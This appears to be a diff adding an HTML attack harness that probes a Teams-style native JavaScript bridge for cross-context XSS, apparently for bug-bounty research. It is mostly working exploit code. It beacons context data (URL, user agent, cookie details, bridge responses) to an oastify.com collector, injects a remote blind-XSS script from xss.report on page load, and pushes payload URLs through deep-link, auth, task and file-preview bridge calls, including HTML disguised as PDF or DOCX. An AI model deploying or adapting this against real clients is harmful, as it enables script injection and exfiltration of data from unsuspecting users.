@@ -1,0 +1,423 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Teams Bridge XSS Surface</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: #0b0f14;
+    color: #d6dde6;
+    font: 12px ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  header {
+    position: sticky;
+    top: 0;
+    z-index: 2;
+    background: #101720;
+    border-bottom: 1px solid #2d3744;
+    padding: 8px;
+  }
+  h1 { font-size: 15px; margin: 0 0 6px; }
+  main { padding: 8px; }
+  section {
+    border: 1px solid #2d3744;
+    background: #151b23;
+    border-radius: 6px;
+    padding: 8px;
+    margin-bottom: 8px;
+  }
+  h2 { font-size: 12px; color: #58a6ff; margin: 0 0 6px; }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+    gap: 5px;
+  }
+  .settings {
+    display: grid;
+    grid-template-columns: 82px 1fr;
+    gap: 5px;
+    align-items: center;
+    margin-top: 6px;
+  }
+  input {
+    width: 100%;
+    min-width: 0;
+    background: #080c10;
+    color: #d6dde6;
+    border: 1px solid #2d3744;
+    border-radius: 4px;
+    padding: 5px;
+    font: inherit;
+  }
+  button {
+    min-height: 34px;
+    text-align: left;
+    background: #1c2430;
+    color: #d6dde6;
+    border: 1px solid #2d3744;
+    border-radius: 4px;
+    padding: 6px;
+    font: inherit;
+  }
+  button.safe { color: #3fb950; border-color: #3fb950; }
+  button.warn { color: #d29922; border-color: #d29922; }
+  button.hot { color: #f0883e; border-color: #f0883e; }
+  #out {
+    white-space: pre-wrap;
+    word-break: break-word;
+    min-height: 260px;
+    max-height: 58vh;
+    overflow: auto;
+    background: #080c10;
+    border: 1px solid #2d3744;
+    border-radius: 6px;
+    padding: 8px;
+  }
+  .ok { color: #3fb950; }
+  .warnText { color: #d29922; }
+  .bad { color: #f85149; }
+  .info { color: #58a6ff; }
+  .hotText { color: #f0883e; }
+</style>
+</head>
+<body>
+<header>
+  <h1>Teams Bridge XSS / Cross-Context Surface</h1>
+  <div class="grid">
+    <button class="safe" onclick="baseline()">Baseline beacon</button>
+    <button onclick="copyLog()">Copy log</button>
+    <button onclick="clearLog()">Clear</button>
+  </div>
+  <div class="settings">
+    <label>OAST</label>
+    <input id="oast" value="s924iasmarwrhw7lpwncu9m7lyrpfh36.oastify.com">
+    <label>Base URL</label>
+    <input id="base" value="https://pedrojuniorrd.github.io/_layouts">
+    <label>BXSS</label>
+    <input id="bxss" value="https://xss.report/c/ztlsavior">
+  </div>
+</header>
+
+<main>
+  <section>
+    <h2>1. Control</h2>
+    <div class="grid">
+      <button class="safe" onclick="baseline()">Current tab beacon</button>
+      <button class="safe" onclick="dumpBridge()">Dump bridge surface</button>
+      <button class="safe" onclick="openPayloadSelf()">Open payload in same tab</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>2. Open New Contexts Through Native Bridge</h2>
+    <div class="grid">
+      <button class="warn" onclick="bridgeExecuteDeepLink(payloadHtml('deeplink'))">executeDeepLink HTML</button>
+      <button class="warn" onclick="bridgeAuth(payloadHtml('auth'))">authentication.authenticate HTML</button>
+      <button class="warn" onclick="bridgeTask(payloadHtml('task'))">tasks.startTask HTML</button>
+      <button class="warn" onclick="bridgeSecondaryBrowser(payloadHtml('secondary'))">secondaryBrowser.open HTML</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>3. FilePreview MIME / Viewer Tests</h2>
+    <div class="grid">
+      <button class="hot" onclick="preview(payloadHtml('fp-html-pdf'), 'pdf', 'HTML as PDF')">HTML as PDF</button>
+      <button class="hot" onclick="preview(payloadHtml('fp-html-svg'), 'svg', 'HTML as SVG')">HTML as SVG</button>
+      <button class="hot" onclick="preview(payloadSvg('fp-svg-svg'), 'svg', 'SVG as SVG')">SVG as SVG</button>
+      <button class="hot" onclick="preview(payloadSvg('fp-svg-pdf'), 'pdf', 'SVG as PDF')">SVG as PDF</button>
+      <button class="hot" onclick="preview(payloadHtml('fp-html-docx'), 'docx', 'HTML as DOCX')">HTML as DOCX</button>
+      <button class="hot" onclick="preview(payloadHtml('fp-html-pptx'), 'pptx', 'HTML as PPTX')">HTML as PPTX</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>4. Message Injection / Handler Surface</h2>
+    <div class="grid">
+      <button class="warn" onclick="processMessage('messageForChild', [payloadHtml('messageForChild')])">process messageForChild</button>
+      <button class="warn" onclick="processMessage('startConversation', [payloadHtml('startConversation')])">process startConversation</button>
+      <button class="warn" onclick="processMessage('themeChange', ['dark'])">process themeChange</button>
+      <button class="warn" onclick="invokeLocalHandlers()">invoke local handlers</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>5. Batch</h2>
+    <div class="grid">
+      <button class="hot" onclick="runQuickBatch()">Run quick batch</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>Output</h2>
+    <div id="out"></div>
+  </section>
+</main>
+
+<script>
+(function () {
+  'use strict';
+
+  var out = document.getElementById('out');
+  var NI = window.nativeInterface || null;
+  var msgId = 52000;
+  var records = [];
+  var origHandle = NI && NI.handleResponseFromNative;
+
+  function log(level, msg, data) {
+    var cls = level === 'ok' ? 'ok' : level === 'bad' ? 'bad' : level === 'hot' ? 'hotText' : level === 'warn' ? 'warnText' : 'info';
+    var line = '[' + new Date().toISOString() + '] [' + level.toUpperCase() + '] ' + msg;
+    var div = document.createElement('div');
+    div.className = cls;
+    div.textContent = line + (data === undefined ? '' : ' ' + safe(data, 2));
+    out.appendChild(div);
+    out.scrollTop = out.scrollHeight;
+    records.push({ ts: new Date().toISOString(), level: level, msg: msg, data: data });
+  }
+
+  function safe(v, d) {
+    if (d === undefined) d = 2;
+    if (d < 0) return '[depth]';
+    if (v === null) return 'null';
+    if (v === undefined) return 'undefined';
+    var t = typeof v;
+    if (t === 'string') return '"' + v.slice(0, 300) + '"';
+    if (t === 'number' || t === 'boolean') return String(v);
+    if (t === 'function') return '[fn ' + (v.name || 'anonymous') + ']';
+    if (Array.isArray(v)) return '[' + v.slice(0, 12).map(function (x) { return safe(x, d - 1); }).join(', ') + ']';
+    if (t === 'object') {
+      var keys;
+      try { keys = Object.getOwnPropertyNames(v); } catch (e) { keys = Object.keys(v); }
+      return '{' + keys.slice(0, 24).map(function (k) {
+        try { return k + ':' + safe(v[k], d - 1); } catch (e) { return k + ':[err]'; }
+      }).join(', ') + '}';
+    }
+    return String(v);
+  }
+
+  function oast() {
+    return document.getElementById('oast').value.trim();
+  }
+
+  function base() {
+    return document.getElementById('base').value.replace(/\/$/, '');
+  }
+
+  function bxss() {
+    return document.getElementById('bxss').value.trim();
+  }
+
+  function encodeParams(obj) {
+    return Object.keys(obj).map(function (k) {
+      return encodeURIComponent(k) + '=' + encodeURIComponent(String(obj[k]).slice(0, 900));
+    }).join('&');
+  }
+
+  function ex(path, data) {
+    var host = oast();
+    if (!host) return;
+    data = data || {};
+    data.ts = Date.now();
+    var url = 'https://' + host + '/' + path + '?' + encodeParams(data);
+    fetch(url, { mode: 'no-cors', cache: 'no-store' }).catch(function () {
+      var img = new Image();
+      img.src = url;
+    });
+  }
+
+  function contextData(label) {
+    return {
+      label: label,
+      href: location.href,
+      origin: location.origin,
+      referrer: document.referrer,
+      ua: navigator.userAgent,
+      topSelf: window.top === window,
+      parentSelf: window.parent === window,
+      hasNI: !!window.nativeInterface,
+      niProps: window.nativeInterface ? Object.getOwnPropertyNames(window.nativeInterface).length : 0,
+      hasWebkit: !!window.webkit,
+      hasTeams: !!window.microsoftTeams,
+      cookiePresent: !!document.cookie,
+      cookieLength: document.cookie ? document.cookie.length : 0
+    };
+  }
+
+  function payloadHtml(label) {
+    var js = [
+      '(function(){',
+      'var d={label:' + JSON.stringify(label) + ',href:location.href,origin:location.origin,referrer:document.referrer,ua:navigator.userAgent,topSelf:top===self,parentSelf:parent===self,hasNI:!!window.nativeInterface,niProps:window.nativeInterface?Object.getOwnPropertyNames(window.nativeInterface).length:0,hasWebkit:!!window.webkit,hasTeams:!!window.microsoftTeams,cookiePresent:!!document.cookie,cookieLength:document.cookie?document.cookie.length:0};',
+      'var q=Object.keys(d).map(function(k){return encodeURIComponent(k)+"="+encodeURIComponent(String(d[k]).slice(0,800));}).join("&");',
+      'new Image().src="https://' + oast() + '/xctx/"+encodeURIComponent(d.label)+"?"+q+"&ts="+Date.now();',
+      'var s=document.createElement("script");s.src=' + JSON.stringify(bxss()) + ';document.documentElement.appendChild(s);',
+      '})();'
+    ].join('');
+    return base() + '/test22-xss-payload.html?label=' + encodeURIComponent(label) +
+      '&oast=' + encodeURIComponent(oast()) +
+      '&bxss=' + encodeURIComponent(bxss()) +
+      '&js=' + encodeURIComponent(js);
+  }
+
+  function payloadSvg(label) {
+    return base() + '/test22-xss-payload.svg?label=' + encodeURIComponent(label) +
+      '&oast=' + encodeURIComponent(oast()) +
+      '&bxss=' + encodeURIComponent(bxss());
+  }
+
+  window.payloadHtml = payloadHtml;
+  window.payloadSvg = payloadSvg;
+
+  if (NI && typeof origHandle === 'function') {
+    NI.handleResponseFromNative = function () {
+      var args = Array.prototype.slice.call(arguments);
+      log('hot', 'native response', { argCount: args.length, id: args[1], preview: String(args[0]).slice(0, 140) });
+      ex('bridge-response', { id: args[1] || '', argc: args.length, preview: String(args[0]).slice(0, 220) });
+      return origHandle.apply(this, arguments);
+    };
+  }
+
+  function bridgeSend(func, args) {
+    NI = window.nativeInterface || NI;
+    if (!NI || !NI.framelessPostMessage) {
+      log('bad', 'nativeInterface.framelessPostMessage missing');
+      return null;
+    }
+    var req = {
+      id: msgId++,
+      func: func,
+      args: args || [],
+      timestamp: Date.now(),
+      apiVersionTag: 'v2_' + String(func).replace(/[^a-zA-Z0-9_.-]/g, '_')
+    };
+    try {
+      NI.framelessPostMessage(JSON.stringify(req));
+      log('info', 'sent bridge func=' + func, { id: req.id, args: args });
+      ex('bridge-send', { id: req.id, func: func, arg0: args && args[0] ? String(args[0]).slice(0, 500) : '' });
+      return req.id;
+    } catch (e) {
+      log('bad', 'bridge send failed ' + func, e.message);
+      ex('bridge-send-error', { func: func, err: e.message });
+      return null;
+    }
+  }
+
+  window.baseline = function () {
+    var data = contextData('controller-tab');
+    log('ok', 'baseline', data);
+    ex('controller-baseline', data);
+    var s = document.createElement('script');
+    s.src = bxss();
+    document.documentElement.appendChild(s);
+  };
+
+  window.dumpBridge = function () {
+    NI = window.nativeInterface || NI;
+    var props = NI ? Object.getOwnPropertyNames(NI) : [];
+    var handlers = NI && NI.handlers ? Object.keys(NI.handlers) : [];
+    var local = NI && NI.localHandlerMap ? Object.keys(NI.localHandlerMap) : [];
+    log(NI ? 'ok' : 'bad', 'bridge dump', { props: props, handlers: handlers, localHandlerMap: local });
+    ex('bridge-dump', { props: props.join(','), handlers: handlers.join(','), localHandlerMap: local.join(',') });
+  };
+
+  window.openPayloadSelf = function () {
+    location.href = payloadHtml('same-tab');
+  };
+
+  window.bridgeExecuteDeepLink = function (url) {
+    bridgeSend('executeDeepLink', [url]);
+  };
+
+  window.bridgeAuth = function (url) {
+    bridgeSend('authentication.authenticate', [{ url: url, width: 640, height: 640 }]);
+  };
+
+  window.bridgeTask = function (url) {
+    bridgeSend('tasks.startTask', [{ url: url, title: 'XSS context probe', width: 640, height: 640 }]);
+  };
+
+  window.bridgeSecondaryBrowser = function (url) {
+    bridgeSend('secondaryBrowser.open', [{ url: url }]);
+  };
+
+  window.preview = function (url, type, title) {
+    var params = [
+      'xss-' + type + '-' + Date.now(),
+      title,
+      'XSS context probe',
+      type,
+      url,
+      url,
+      url,
+      '',
+      '',
+      false,
+      '',
+      'view',
+      0,
+      '',
+      4096,
+      '',
+      '',
+      '',
+      '',
+      ''
+    ];
+    bridgeSend('openFilePreview', params);
+  };
+
+  window.processMessage = function (func, args) {
+    NI = window.nativeInterface || NI;
+    if (!NI || !NI.processMessageRequest) {
+      log('bad', 'processMessageRequest missing');
+      return;
+    }
+    var req = { id: msgId++, func: func, args: args || [], timestamp: Date.now() };
+    try {
+      var ret = NI.processMessageRequest(JSON.stringify(req));
+      log('warn', 'processMessageRequest sent', { req: req, ret: ret });
+      ex('process-message', { id: req.id, func: func, ret: safe(ret, 1) });
+    } catch (e) {
+      log('bad', 'processMessageRequest threw', e.message);
+      ex('process-message-error', { func: func, err: e.message });
+    }
+  };
+
+  window.invokeLocalHandlers = function () {
+    NI = window.nativeInterface || NI;
+    if (!NI || !NI.localHandlerMap) {
+      log('bad', 'localHandlerMap missing');
+      return;
+    }
+    Object.keys(NI.localHandlerMap).forEach(function (name, i) {
+      setTimeout(function () {
+        try {
+          var fn = NI.localHandlerMap[name];
+          log('warn', 'local handler candidate', { name: name, type: typeof fn });
+          ex('local-handler-candidate', { name: name, type: typeof fn });
+          if (typeof fn === 'function') {
+            fn({ url: payloadHtml('local-' + name), title: 'XSS context probe' });
+          }
+        } catch (e) {
+          log('bad', 'local handler threw ' + name, e.message);
+          ex('local-handler-error', { name: name, err: e.message });
+        }
+      }, i * 350);
+    });
+  };
+
+  window.runQuickBatch = function () {
+    baseline();
+    setTimeout(function () { dumpBridge(); }, 300);
+    setTimeout(function () { bridgeExecuteDeepLink(payloadHtml('batch-deeplink')); }, 800);
+    setTimeout(function () { bridgeAuth(payloadHtml('batch-auth')); }, 1600);
+    setTimeout(function () { preview(payloadHtml('batch-html-pdf'), 'pdf', 'Batch HTML as PDF'); }, 2600);
+    setTimeout(function () { preview(payloadSvg('batch-svg-svg'), 'svg', 'Batch SVG as SVG'); }, 3800);
+  };
+
+  baseline();
+})();
+</script>
+</body>
+</html>
